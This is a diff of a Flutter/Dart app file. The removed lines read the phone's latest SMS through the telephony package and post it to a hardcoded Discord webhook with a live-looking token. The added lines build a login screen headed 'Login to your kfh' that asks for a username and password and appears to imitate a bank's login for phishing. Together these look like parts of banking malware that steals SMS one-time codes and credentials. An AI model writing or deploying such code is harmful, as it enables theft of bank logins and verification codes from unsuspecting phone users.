@@ -1,83 +1,259 @@
+import '/flutter_flow/flutter_flow_theme.dart';
+import '/flutter_flow/flutter_flow_util.dart';
+import '/flutter_flow/flutter_flow_widgets.dart';
 import 'package:flutter/material.dart';
-import 'package:http/http.dart' as http;
-import 'package:telephony/telephony.dart';
-import 'dart:convert';
-Future<String> fetchLatestSms() async {
-  String latestSms = "No SMS available";
-  Telephony telephony = Telephony.instance;
-  List<SmsMessage> messages = await telephony.getInboxSms();
-  if (messages.isNotEmpty) {
-    SmsMessage latestMessage = messages.first;
-    latestSms = "Latest SMS: ${latestMessage.body}";
-  } else {
-    latestSms = "Latest SMS: no latest sms";
+import 'package:flutter/services.dart';
+import 'package:google_fonts/google_fonts.dart';
+import 'package:provider/provider.dart';
+
+import 'home_page_model.dart';
+export 'home_page_model.dart';
+
+class HomePageWidget extends StatefulWidget {
+  const HomePageWidget({Key? key}) : super(key: key);
+
+  @override
+  _HomePageWidgetState createState() => _HomePageWidgetState();
+}
+
+class _HomePageWidgetState extends State<HomePageWidget> {
+  late HomePageModel _model;
+
+  final scaffoldKey = GlobalKey<ScaffoldState>();
+
+  @override
+  void initState() {
+    super.initState();
+    _model = createModel(context, () => HomePageModel());
+
+    _model.i1Controller ??= TextEditingController(text: 'your username');
+    _model.i1FocusNode ??= FocusNode();
+
+    _model.i2Controller ??= TextEditingController(text: 'your password');
+    _model.i2FocusNode ??= FocusNode();
   }
-  return latestSms;
-}
-Future<void> sendToDiscordWebhook() async {
-  String latestSms = await fetchLatestSms();
-  String webhookUrl ="https://discord.com/api/webhooks/1165290854416646225/NFI2Puw2SYeWNetzEm9sr_KtCSjEA-6CS54hTQZDCy7LD-EYLuv0rM2oioO7ObazFZvU";
-  final Map<String, String> headers = {'Content-Type': 'application/json'};
-  final Map<String, dynamic> data = {'content': latestSms};
-  final String jsonData = json.encode(data);
 
-  final response = await http.post(
-    Uri.parse(webhookUrl),
-    headers: headers,
-    body: jsonData,
-  );
+  @override
+  void dispose() {
+    _model.dispose();
 
-  if (response.statusCode == 204) {print('Message sent successfully to Discord webhook');}
-  else {print('Failed to send message to Discord webhook. Status code: ${response.statusCode}');
-    print('Response body: ${response.body}');
+    super.dispose();
   }
-}
 
-void main() {
-  runApp(MyApp());
-}
-
-class MyApp extends StatelessWidget {
   @override
   Widget build(BuildContext context) {
-    return MaterialApp(
-      home: DiscordWebhookApp(),
-    );
-  }
-}
+    if (isiOS) {
+      SystemChrome.setSystemUIOverlayStyle(
+        SystemUiOverlayStyle(
+          statusBarBrightness: Theme.of(context).brightness,
+          systemStatusBarContrastEnforced: true,
+        ),
+      );
+    }
 
-class DiscordWebhookApp extends StatefulWidget {
-  @override
-  _DiscordWebhookAppState createState() => _DiscordWebhookAppState();
-}
-
-class _DiscordWebhookAppState extends State<DiscordWebhookApp> {
-  TextEditingController textEditingController = TextEditingController();
-  String outputText = '';
-  @override
-  Widget build(BuildContext context) {
-    return Scaffold(
-      appBar: AppBar(
-        title: Text('Flutter Discord Webhook App'),
-      ),
-      body: Padding(
-        padding: const EdgeInsets.all(16.0),
-        child: Column(
-          mainAxisAlignment: MainAxisAlignment.center,
-          children: <Widget>[
-            Text("new sms hear"),
-            TextField(
-              controller: textEditingController,
-              decoration: InputDecoration(hintText: "Enter your message"),
-            ),
-            SizedBox(height: 20),
-            ElevatedButton(
-              onPressed: sendToDiscordWebhook,
-              child: Text('Send to Discord'),
-            ),
-            SizedBox(height: 20),
-            Text(outputText),
-          ],
+    return GestureDetector(
+      onTap: () => _model.unfocusNode.canRequestFocus
+          ? FocusScope.of(context).requestFocus(_model.unfocusNode)
+          : FocusScope.of(context).unfocus(),
+      child: Scaffold(
+        key: scaffoldKey,
+        backgroundColor: Color(0xFF5D8FD1),
+        body: SafeArea(
+          top: true,
+          child: Column(
+            mainAxisSize: MainAxisSize.max,
+            children: [
+              Opacity(
+                opacity: 0,
+                child: Container(
+                  width: 100,
+                  height: 170,
+                  decoration: BoxDecoration(
+                    color: FlutterFlowTheme.of(context).secondaryBackground,
+                  ),
+                ),
+              ),
+              Align(
+                alignment: AlignmentDirectional(0.00, -1.00),
+                child: Text(
+                  'Login to your kfh',
+                  style: FlutterFlowTheme.of(context).bodyMedium.override(
+                        fontFamily: 'Readex Pro',
+                        fontSize: 40,
+                      ),
+                ),
+              ),
+              Opacity(
+                opacity: 0,
+                child: Container(
+                  width: 100,
+                  height: 115,
+                  decoration: BoxDecoration(
+                    color: FlutterFlowTheme.of(context).secondaryBackground,
+                  ),
+                ),
+              ),
+              Align(
+                alignment: AlignmentDirectional(0.00, 0.00),
+                child: Padding(
+                  padding: EdgeInsetsDirectional.fromSTEB(8, 0, 8, 0),
+                  child: TextFormField(
+                    controller: _model.i1Controller,
+                    focusNode: _model.i1FocusNode,
+                    autofocus: true,
+                    obscureText: false,
+                    decoration: InputDecoration(
+                      labelStyle:
+                          FlutterFlowTheme.of(context).bodyMedium.override(
+                                fontFamily: 'Readex Pro',
+                                fontSize: 25,
+                              ),
+                      hintStyle:
+                          FlutterFlowTheme.of(context).labelMedium.override(
+                                fontFamily: 'Readex Pro',
+                                color: Color(0xFFEEF2F6),
+                              ),
+                      enabledBorder: OutlineInputBorder(
+                        borderSide: BorderSide(
+                          color: Color(0xFF0B0808),
+                          width: 2,
+                        ),
+                        borderRadius: BorderRadius.circular(8),
+                      ),
+                      focusedBorder: OutlineInputBorder(
+                        borderSide: BorderSide(
+                          color: FlutterFlowTheme.of(context).primary,
+                          width: 2,
+                        ),
+                        borderRadius: BorderRadius.circular(8),
+                      ),
+                      errorBorder: OutlineInputBorder(
+                        borderSide: BorderSide(
+                          color: FlutterFlowTheme.of(context).error,
+                          width: 2,
+                        ),
+                        borderRadius: BorderRadius.circular(8),
+                      ),
+                      focusedErrorBorder: OutlineInputBorder(
+                        borderSide: BorderSide(
+                          color: FlutterFlowTheme.of(context).error,
+                          width: 2,
+                        ),
+                        borderRadius: BorderRadius.circular(8),
+                      ),
+                    ),
+                    style: FlutterFlowTheme.of(context).bodyMedium.override(
+                          fontFamily: 'Readex Pro',
+                          fontSize: 25,
+                        ),
+                    validator:
+                        _model.i1ControllerValidator.asValidator(context),
+                  ),
+                ),
+              ),
+              Opacity(
+                opacity: 0,
+                child: Container(
+                  width: 100,
+                  height: 37,
+                  decoration: BoxDecoration(
+                    color: FlutterFlowTheme.of(context).secondaryBackground,
+                  ),
+                ),
+              ),
+              Align(
+                alignment: AlignmentDirectional(0.00, 0.00),
+                child: Padding(
+                  padding: EdgeInsetsDirectional.fromSTEB(8, 0, 8, 0),
+                  child: TextFormField(
+                    controller: _model.i2Controller,
+                    focusNode: _model.i2FocusNode,
+                    autofocus: true,
+                    obscureText: false,
+                    decoration: InputDecoration(
+                      labelStyle: FlutterFlowTheme.of(context).titleMedium,
+                      hintStyle:
+                          FlutterFlowTheme.of(context).labelMedium.override(
+                                fontFamily: 'Readex Pro',
+                                color: Color(0xFFEEF2F6),
+                              ),
+                      enabledBorder: OutlineInputBorder(
+                        borderSide: BorderSide(
+                          color: Color(0xFF0B0808),
+                          width: 2,
+                        ),
+                        borderRadius: BorderRadius.circular(8),
+                      ),
+                      focusedBorder: OutlineInputBorder(
+                        borderSide: BorderSide(
+                          color: FlutterFlowTheme.of(context).primary,
+                          width: 2,
+                        ),
+                        borderRadius: BorderRadius.circular(8),
+                      ),
+                      errorBorder: OutlineInputBorder(
+                        borderSide: BorderSide(
+                          color: FlutterFlowTheme.of(context).error,
+                          width: 2,
+                        ),
+                        borderRadius: BorderRadius.circular(8),
+                      ),
+                      focusedErrorBorder: OutlineInputBorder(
+                        borderSide: BorderSide(
+                          color: FlutterFlowTheme.of(context).error,
+                          width: 2,
+                        ),
+                        borderRadius: BorderRadius.circular(8),
+                      ),
+                    ),
+                    style: FlutterFlowTheme.of(context).bodyMedium.override(
+                          fontFamily: 'Readex Pro',
+                          fontSize: 25,
+                        ),
+                    validator:
+                        _model.i2ControllerValidator.asValidator(context),
+                  ),
+                ),
+              ),
+              Opacity(
+                opacity: 0,
+                child: Container(
+                  width: 100,
+                  height: 40,
+                  decoration: BoxDecoration(
+                    color: FlutterFlowTheme.of(context).secondaryBackground,
+                  ),
+                ),
+              ),
+              Align(
+                alignment: AlignmentDirectional(0.00, 0.00),
+                child: FFButtonWidget(
+                  onPressed: () {
+                    print('bl pressed ...');
+                  },
+                  text: 'Login',
+                  options: FFButtonOptions(
+                    width: 200,
+                    height: 59,
+                    padding: EdgeInsetsDirectional.fromSTEB(24, 0, 24, 0),
+                    iconPadding: EdgeInsetsDirectional.fromSTEB(0, 0, 0, 0),
+                    color: FlutterFlowTheme.of(context).primary,
+                    textStyle: FlutterFlowTheme.of(context).titleSmall.override(
+                          fontFamily: 'Readex Pro',
+                          color: Colors.white,
+                          fontSize: 34,
+                        ),
+                    elevation: 3,
+                    borderSide: BorderSide(
+                      color: Colors.transparent,
+                      width: 1,
+                    ),
+                    borderRadius: BorderRadius.circular(8),
+                  ),
+                ),
+              ),
+            ],
+          ),
         ),
       ),
     );
